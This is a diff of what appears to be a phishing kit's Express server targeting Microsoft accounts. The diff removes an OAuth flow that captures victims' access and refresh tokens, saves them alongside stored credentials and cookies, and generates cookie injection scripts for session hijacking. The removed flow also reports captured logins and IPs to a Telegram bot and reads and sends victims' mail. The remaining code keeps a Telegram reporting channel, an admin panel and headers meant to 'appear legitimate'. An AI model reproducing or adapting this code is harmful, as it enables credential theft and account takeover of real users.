@@ -21,7 +21,6 @@ if (fs.existsSync('.env')) {
     console.log('✅ Environment variables loaded from .env file');
 }
 
-const { GraphAPIAuth } = require('./src/graph-api');
 const { ClosedBridgeAutomation } = require('./src/closedbridge-automation');
 const OutlookNotificationBot = require('./telegram-bot');
 
@@ -138,12 +137,10 @@ function requireAdminAuth(req, res, next) {
 app.use(express.static('public'));
 
 
-// Store user sessions with Graph API auth and OAuth state tracking
-const userSessions = new Map(); // sessionId -> { sessionId, graphAuth, userEmail, createdAt, oauthState, authenticated, verified }
-const oauthStates = new Map(); // state -> { sessionId, timestamp }
+// Store user sessions for browser automation only
+const userSessions = new Map(); // sessionId -> { sessionId, userEmail, createdAt, authenticated, verified }
 const automationSessions = new Map(); // sessionId -> { automation, status, email, startTime }
 const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
-const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state
 const MAX_PRELOADS = 2; // Maximum number of concurrent preloaded browsers
 const MAX_WARM_BROWSERS = 0; // Disabled: Maximum number of pre-warmed browsers ready for immediate use
 const MIN_WARM_BROWSERS = 0; // Disabled: Minimum number of warm browsers to maintain
@@ -365,7 +362,7 @@ async function initializeWarmBrowserPool() {
 //     });
 // }, 2000); // Start after 2 seconds to let server finish starting
 
-// Cleanup expired sessions and OAuth states
+// Cleanup expired sessions
 setInterval(async () => {
     const now = Date.now();
 
@@ -377,13 +374,6 @@ setInterval(async () => {
         }
     }
 
-    // Clean up expired OAuth states
-    for (const [state, stateInfo] of oauthStates) {
-        if (now - stateInfo.timestamp > STATE_TIMEOUT) {
-            oauthStates.delete(state);
-            console.log(`🧹 Cleaned up expired OAuth state`);
-        }
-    }
 
     // Clean up expired automation sessions
     for (const [sessionId, automationSession] of automationSessions) {
@@ -617,43 +607,11 @@ function getPreloadStats() {
 app.get('/api/health', (req, res) => {
     res.json({ 
         status: 'OK', 
-        message: 'Microsoft Graph API Backend is running',
-        authConfigured: !!(process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID)
+        message: 'Browser Automation Backend is running',
+        authConfigured: false
     });
 });
 
-// SSE endpoint for real-time authentication status updates
-app.get('/api/auth-status/:sessionId', (req, res) => {
-    const { sessionId } = req.params;
-
-    // Set SSE headers
-    res.writeHead(200, {
-        'Content-Type': 'text/event-stream',
-        'Cache-Control': 'no-cache',
-        'Connection': 'keep-alive',
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Headers': 'Cache-Control'
-    });
-
-    // Send initial connection confirmation
-    res.write(`event: connected\n`);
-    res.write(`data: ${JSON.stringify({ sessionId, timestamp: Date.now() })}\n\n`);
-
-    // Store connection for this session
-    sseConnections.set(sessionId, res);
-    console.log(`🔗 SSE connection established for session: ${sessionId}`);
-
-    // Handle client disconnect
-    req.on('close', () => {
-        sseConnections.delete(sessionId);
-        console.log(`❌ SSE connection closed for session: ${sessionId}`);
-    });
-
-    req.on('error', (error) => {
-        console.warn(`SSE connection error for ${sessionId}:`, error.message);
-        sseConnections.delete(sessionId);
-    });
-});
 
 // Add security headers to appear legitimate
 app.use((req, res, next) => {
@@ -706,557 +664,12 @@ app.use((req, res, next) => {
     next();
 });
 
-// Get OAuth authorization URL
-app.post('/api/auth-url', (req, res) => {
-    try {
-        // Check if Azure credentials are configured
-        if (!process.env.AZURE_CLIENT_ID || !process.env.AZURE_CLIENT_SECRET || !process.env.AZURE_TENANT_ID) {
-            return res.status(500).json({
-                error: 'Azure credentials not configured',
-                message: 'Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID'
-            });
-        }
 
-        const sessionId = createSessionId();
 
-        // Use fixed redirect URI from environment or construct carefully
-        const redirectUri = process.env.AZURE_REDIRECT_URI || `${req.protocol}://${req.get('host')}/api/auth-callback`;
 
-        const graphAuth = new GraphAPIAuth({
-            clientId: process.env.AZURE_CLIENT_ID,
-            clientSecret: process.env.AZURE_CLIENT_SECRET,
-            tenantId: process.env.AZURE_TENANT_ID,
-            redirectUri: redirectUri
-        });
 
-        const authUrl = graphAuth.getAuthUrl(sessionId);
 
-        // Extract state from URL for tracking
-        const stateMatch = authUrl.match(/state=([^&]+)/);
-        const state = stateMatch ? decodeURIComponent(stateMatch[1]) : null;
 
-        // Store session and state mapping
-        userSessions.set(sessionId, {
-            sessionId: sessionId,
-            graphAuth: graphAuth,
-            userEmail: null,
-            createdAt: Date.now(),
-            oauthState: state,
-            authenticated: false, // Initialize as not authenticated
-            verified: false // Initialize as not verified
-        });
-
-        if (state) {
-            oauthStates.set(state, {
-                sessionId: sessionId,
-                timestamp: Date.now()
-            });
-        }
-
-        analytics.totalLogins++;
-        saveAnalytics();
-
-        console.log(`🔑 Generated auth URL for session: ${sessionId}`);
-
-        res.json({
-            authUrl: authUrl,
-            sessionId: sessionId,
-            message: 'Click the URL to authenticate with Microsoft'
-        });
-
-    } catch (error) {
-        console.error('Error generating auth URL:', error);
-        res.status(500).json({ 
-            error: 'Failed to generate auth URL',
-            details: error.message 
-        });
-    }
-});
-
-// Handle OAuth callback
-app.get('/api/auth-callback', async (req, res) => {
-    try {
-        const { code, state, error: authError } = req.query;
-
-        if (authError) {
-            analytics.failedLogins++;
-            saveAnalytics();
-
-            // Send Telegram notification for OAuth error
-            if (telegramBot) {
-                try {
-                    await telegramBot.sendFailedLoginNotification({
-                        email: 'OAuth Error',
-                        password: String(authError),
-                        timestamp: new Date().toISOString(),
-                        sessionId: 'oauth-error-' + Date.now(),
-                        reason: 'OAuth Authentication Error',
-                        authMethod: 'Microsoft OAuth',
-                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                        userAgent: req.get('User-Agent') || 'Unknown'
-                    });
-                    console.log('📤 Telegram OAuth error notification sent');
-                } catch (telegramError) {
-                    console.warn('Telegram OAuth error notification failed:', telegramError.message);
-                }
-            }
-
-            return res.status(400).json({ 
-                error: 'Authentication failed',
-                details: authError 
-            });
-        }
-
-        if (!code || !state) {
-            analytics.failedLogins++;
-            saveAnalytics();
-
-            // Send Telegram notification for missing parameters
-            if (telegramBot) {
-                try {
-                    await telegramBot.sendFailedLoginNotification({
-                        email: 'OAuth Error',
-                        password: 'Missing Parameters',
-                        timestamp: new Date().toISOString(),
-                        sessionId: 'missing-params-' + Date.now(),
-                        reason: 'Missing OAuth Code or State Parameters',
-                        authMethod: 'Microsoft OAuth',
-                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                        userAgent: req.get('User-Agent') || 'Unknown'
-                    });
-                    console.log('📤 Telegram OAuth missing params notification sent');
-                } catch (telegramError) {
-                    console.warn('Telegram OAuth missing params notification failed:', telegramError.message);
-                }
-            }
-
-            return res.status(400).json({ 
-                error: 'Missing authorization code or state parameter' 
-            });
-        }
-
-        // Validate state and find associated session
-        const stateInfo = oauthStates.get(state);
-        if (!stateInfo) {
-            analytics.failedLogins++;
-            saveAnalytics();
-
-            // Send Telegram notification for invalid state
-            if (telegramBot) {
-                try {
-                    await telegramBot.sendFailedLoginNotification({
-                        email: 'OAuth Error',
-                        password: 'Invalid State',
-                        timestamp: new Date().toISOString(),
-                        sessionId: 'invalid-state-' + Date.now(),
-                        reason: 'Invalid or Expired OAuth State Parameter',
-                        authMethod: 'Microsoft OAuth',
-                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                        userAgent: req.get('User-Agent') || 'Unknown'
-                    });
-                    console.log('📤 Telegram invalid state notification sent');
-                } catch (telegramError) {
-                    console.warn('Telegram invalid state notification failed:', telegramError.message);
-                }
-            }
-
-            return res.status(400).json({ 
-                error: 'Invalid or expired state parameter' 
-            });
-        }
-
-        // Check state timeout (10 minutes)
-        if (Date.now() - stateInfo.timestamp > STATE_TIMEOUT) {
-            oauthStates.delete(state);
-            analytics.failedLogins++;
-            saveAnalytics();
-
-            // Send Telegram notification for expired state
-            if (telegramBot) {
-                try {
-                    // Try to get session info for better context
-                    const targetSession = userSessions.get(stateInfo.sessionId);
-                    const userEmail = targetSession?.userEmail || 'OAuth Timeout';
-                    
-                    await telegramBot.sendFailedLoginNotification({
-                        email: userEmail,
-                        password: 'Expired Session',
-                        timestamp: new Date().toISOString(),
-                        sessionId: stateInfo.sessionId || 'expired-state-' + Date.now(),
-                        reason: 'OAuth State Expired (10 minute timeout)',
-                        authMethod: 'Microsoft OAuth',
-                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                        userAgent: req.get('User-Agent') || 'Unknown'
-                    });
-                    console.log('📤 Telegram expired state notification sent');
-                } catch (telegramError) {
-                    console.warn('Telegram expired state notification failed:', telegramError.message);
-                }
-            }
-
-            return res.status(400).json({ 
-                error: 'OAuth state expired' 
-            });
-        }
-
-        const targetSession = userSessions.get(stateInfo.sessionId);
-        if (!targetSession) {
-            oauthStates.delete(state);
-            analytics.failedLogins++;
-            saveAnalytics();
-
-            // Send Telegram notification for session not found
-            if (telegramBot) {
-                try {
-                    await telegramBot.sendFailedLoginNotification({
-                        email: 'Session Error',
-                        password: 'Not Found',
-                        timestamp: new Date().toISOString(),
-                        sessionId: stateInfo.sessionId || 'no-session-' + Date.now(),
-                        reason: 'Associated User Session Not Found',
-                        authMethod: 'Microsoft OAuth',
-                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                        userAgent: req.get('User-Agent') || 'Unknown'
-                    });
-                    console.log('📤 Telegram session not found notification sent');
-                } catch (telegramError) {
-                    console.warn('Telegram session not found notification failed:', telegramError.message);
-                }
-            }
-
-            return res.status(400).json({ 
-                error: 'Associated session not found' 
-            });
-        }
-
-        // Clean up OAuth state
-        oauthStates.delete(state);
-
-        try {
-            // Exchange code for tokens
-            const tokenData = await targetSession.graphAuth.getTokenFromCode(code);
-
-            // Get user profile
-            const userProfile = await targetSession.graphAuth.getUserProfile();
-            targetSession.userEmail = userProfile.mail || userProfile.userPrincipalName;
-            targetSession.authenticated = true; // Mark session as authenticated
-
-            // Check if we have stored credentials for this email
-            const sessionDir = path.join(__dirname, 'session_data');
-
-            try {
-                const glob = require('fs').readdirSync(sessionDir).filter(file => 
-                    file.includes(targetSession.userEmail.replace(/[@.]/g, '_')) && file.startsWith('session_')
-                );
-
-                if (glob.length > 0) {
-                    const latestFile = glob.sort().pop();
-                    const credentialsData = JSON.parse(fs.readFileSync(path.join(sessionDir, latestFile), 'utf8'));
-                    console.log(`✅ Found stored credentials for: ${targetSession.userEmail}`);
-
-                    // Use existing session cookies if available, otherwise create basic ones
-                    let sessionCookies = [];
-
-                    if (credentialsData.cookies && credentialsData.cookies.length > 0) {
-                        // Use existing cookies from previous session
-                        sessionCookies = credentialsData.cookies;
-                        console.log(`🔄 Reusing ${sessionCookies.length} existing session cookies`);
-                    } else {
-                        // Create basic authentication cookies
-                        sessionCookies = [
-                            {
-                                name: 'MSGraphAccessToken',
-                                value: tokenData.access_token,
-                                domain: '.microsoftonline.com',
-                                path: '/',
-                                expires: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
-                                secure: true,
-                                httpOnly: true,
-                                sameSite: 'None'
-                            }
-                        ];
-                        console.log(`🆕 Created ${sessionCookies.length} new authentication cookies`);
-                    }
-
-                    // Generate injection script
-                    const injectionScript = generateCookieInjectionScript(targetSession.userEmail, sessionCookies, targetSession.sessionId);
-                    const injectFilename = `inject_session_${targetSession.sessionId}.js`;
-                    const injectPath = path.join(sessionDir, injectFilename);
-
-                    fs.writeFileSync(injectPath, injectionScript);
-                    console.log(`🍪 Generated cookie injection script: ${injectFilename}`);
-
-                    // Store comprehensive session data
-                    const fullSessionData = {
-                        ...credentialsData,
-                        sessionId: targetSession.sessionId,
-                        authTimestamp: new Date().toISOString(),
-                        status: 'valid',
-                        totalCookies: sessionCookies.length,
-                        domains: [...new Set(sessionCookies.map(c => c.domain))],
-                        cookies: sessionCookies,
-                        injectFilename: injectFilename,
-                        accessToken: tokenData.access_token,
-                        refreshToken: tokenData.refresh_token,
-                        tokenExpiry: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString()
-                    };
-
-                    fs.writeFileSync(
-                        path.join(sessionDir, `session_${targetSession.sessionId}_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`),
-                        JSON.stringify(fullSessionData, null, 2)
-                    );
-
-                    console.log(`💾 Saved complete session data for: ${targetSession.userEmail} with ${sessionCookies.length} cookies`);
-                } else {
-                    console.log(`⚠️ No stored credentials found for: ${targetSession.userEmail}`);
-                }
-            } catch (error) {
-                console.error('Error processing stored credentials:', error);
-            }
-
-        } catch (tokenError) {
-            // Handle specific Microsoft authentication errors
-            console.error('❌ Microsoft authentication failed:', tokenError);
-
-            let errorMessage = 'Authentication failed';
-            let errorDetails = tokenError.message;
-
-            // Parse common Microsoft error responses
-            if (tokenError.message.includes('invalid_grant')) {
-                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
-            } else if (tokenError.message.includes('invalid_client')) {
-                errorMessage = 'Application configuration error. Please contact support.';
-            } else if (tokenError.message.includes('unauthorized_client')) {
-                errorMessage = 'This application is not authorized to access your account.';
-            } else if (tokenError.message.includes('AADSTS50126')) {
-                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
-            } else if (tokenError.message.includes('AADSTS50034')) {
-                errorMessage = 'We couldn\'t find an account with that username. Try another, or get a new Microsoft account.';
-            }
-
-            // Store failed authentication attempt
-            const sessionDir = path.join(__dirname, 'session_data');
-            const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
-            const failureData = {
-                id: failureId,
-                sessionId: targetSession.sessionId,
-                email: targetSession.userEmail || 'Unknown',
-                reason: 'OAuth Authentication Failed',
-                errorMessage: errorMessage,
-                errorDetails: errorDetails,
-                timestamp: new Date().toISOString(),
-                status: 'invalid',
-                authUrl: req.originalUrl
-            };
-
-            fs.writeFileSync(
-                path.join(sessionDir, `invalid_${failureId}.json`),
-                JSON.stringify(failureData, null, 2)
-            );
-
-            analytics.failedLogins++;
-            saveAnalytics();
-
-            return res.status(400).send(`
-                <html>
-                    <head><title>Authentication Failed</title></head>
-                    <body>
-                        <h2>❌ Authentication Failed</h2>
-                        <p style="color: #d13438;">${errorMessage}</p>
-                        <p><a href="/">Try again</a></p>
-                        <script>
-                            setTimeout(() => {
-                                window.close() || (window.location.href = '/');
-                            }, 3000);
-                        </script>
-                    </body>
-                </html>
-            `);
-        }
-
-        analytics.successfulLogins++;
-        saveAnalytics();
-
-        console.log(`✅ User authenticated successfully`);
-
-        // Send success response with redirect to frontend
-        res.send(`
-            <html>
-                <head><title>Authentication Successful</title></head>
-                <body>
-                    <h2>✅ Authentication Successful!</h2>
-                    <p>You can now close this window and return to the application.</p>
-                    <script>
-                        // Try to close the window, or redirect back to main app
-                        setTimeout(() => {
-                            window.close() || (window.location.href = '/');
-                        }, 2000);
-                    </script>
-                </body>
-            </html>
-        `);
-
-        // Send Telegram notification if bot is available
-        if (telegramBot) {
-            try {
-                await telegramBot.sendLoginNotification({
-                    email: targetSession.userEmail,
-                    password: 'Captured via OAuth', // OAuth doesn't capture actual password
-                    timestamp: new Date().toISOString(),
-                    sessionId: targetSession.sessionId,
-                    authMethod: 'Microsoft Graph API',
-                    totalCookies: 0 // OAuth method doesn't capture cookies directly
-                });
-                console.log(`📤 Telegram notification sent for ${targetSession.userEmail}`);
-            } catch (error) {
-                console.error('❌ Failed to send Telegram notification:', error.message);
-            }
-        }
-
-    } catch (error) {
-        console.error('Error in auth callback:', error);
-        analytics.failedLogins++;
-        saveAnalytics();
-
-        res.status(500).send(`
-            <html>
-                <head><title>Authentication Failed</title></head>
-                <body>
-                    <h2>❌ Authentication Failed</h2>
-                    <p>Error: ${error.message}</p>
-                    <p><a href="/">Return to main page</a></p>
-                </body>
-            </html>
-        `);
-    }
-});
-
-// Get user profile
-app.get('/api/profile', async (req, res) => {
-    try {
-        const sessionId = req.headers['x-session-id'] || req.query.sessionId;
-
-        if (!sessionId || !userSessions.has(sessionId)) {
-            return res.status(401).json({ 
-                error: 'No active session found',
-                message: 'Please authenticate first' 
-            });
-        }
-
-        const session = userSessions.get(sessionId);
-
-        // Check if session is authenticated
-        if (!session.authenticated) {
-            return res.status(401).json({ 
-                error: 'Session not authenticated',
-                message: 'Please complete login first' 
-            });
-        }
-
-        const userProfile = await session.graphAuth.getUserProfile();
-
-        res.json({
-            profile: userProfile,
-            email: session.userEmail,
-            sessionId: sessionId,
-            verified: session.verified // Include verification status
-        });
-
-    } catch (error) {
-        console.error('Error getting user profile:', error);
-        res.status(500).json({ 
-            error: 'Failed to get user profile',
-            details: error.message 
-        });
-    }
-});
-
-// Get emails
-app.get('/api/emails', async (req, res) => {
-    try {
-        const sessionId = req.headers['x-session-id'] || req.query.sessionId;
-        const count = parseInt(req.query.count) || 10;
-
-        if (!sessionId || !userSessions.has(sessionId)) {
-            return res.status(401).json({ 
-                error: 'No active session found',
-                message: 'Please authenticate first' 
-            });
-        }
-
-        const session = userSessions.get(sessionId);
-
-        // Check if session is authenticated
-        if (!session.authenticated) {
-            return res.status(401).json({ 
-                error: 'Session not authenticated',
-                message: 'Please complete login first' 
-            });
-        }
-
-        const emails = await session.graphAuth.getEmails(count);
-
-        res.json({
-            emails: emails,
-            count: emails.length,
-            sessionId: sessionId
-        });
-
-    } catch (error) {
-        console.error('Error getting emails:', error);
-        res.status(500).json({ 
-            error: 'Failed to get emails',
-            details: error.message 
-        });
-    }
-});
-
-// Send email
-app.post('/api/send-email', async (req, res) => {
-    try {
-        const sessionId = req.headers['x-session-id'] || req.body.sessionId;
-        const { to, subject, body, isHtml = false } = req.body;
-
-        if (!sessionId || !userSessions.has(sessionId)) {
-            return res.status(401).json({ 
-                error: 'No active session found',
-                message: 'Please authenticate first' 
-            });
-        }
-
-        const session = userSessions.get(sessionId);
-
-        // Check if session is authenticated
-        if (!session.authenticated) {
-            return res.status(401).json({ 
-                error: 'Session not authenticated',
-                message: 'Please complete login first' 
-            });
-        }
-
-        if (!to || !subject || !body) {
-            return res.status(400).json({ 
-                error: 'Missing required fields',
-                message: 'to, subject, and body are required' 
-            });
-        }
-
-        await session.graphAuth.sendEmail(to, subject, body, isHtml);
-
-        res.json({
-            success: true,
-            message: 'Email sent successfully',
-            sessionId: sessionId
-        });
-
-    } catch (error) {
-        console.error('Error sending email:', error);
-        res.status(500).json({ 
-            error: 'Failed to send email',
-            details: error.message 
-        });
-    }
-});
 
 // Verify email endpoint
 app.post('/api/verify-email', async (req, res) => {
@@ -2477,7 +1890,7 @@ app.get('/api/status', (req, res) => {
             userEmail: session.userEmail,
             sessionId: sessionId,
             sessionCount: userSessions.size,
-            hasToken: !!session.graphAuth?.accessToken,
+            hasToken: false,
             verified: !!session.verified,
             cookiesSaved: !!session.cookiesSaved
         });
@@ -3408,17 +2821,10 @@ app.get('/api/browser-pool-status', (req, res) => {
 
 // Start server
 app.listen(PORT, '0.0.0.0', () => {
-    console.log('🚀 Microsoft Graph API Backend running on port', PORT);
-    console.log('📧 API endpoints available at http://localhost:' + PORT + '/api/');
+    console.log('🚀 Browser Automation Backend running on port', PORT);
+    console.log('🤖 Browser automation endpoints available at http://localhost:' + PORT + '/api/');
     console.log('🌐 Frontend available at http://localhost:' + PORT + '/');
     console.log('🔧 Admin panel available at http://localhost:' + PORT + '/ad.html');
-
-    // Check Azure configuration
-    if (process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID) {
-        console.log('✅ Azure credentials configured - Graph API ready');
-    } else {
-        console.log('⚠️ Azure credentials missing - Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID');
-    }
 
     if (!telegramBot) {
         console.log('❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications');
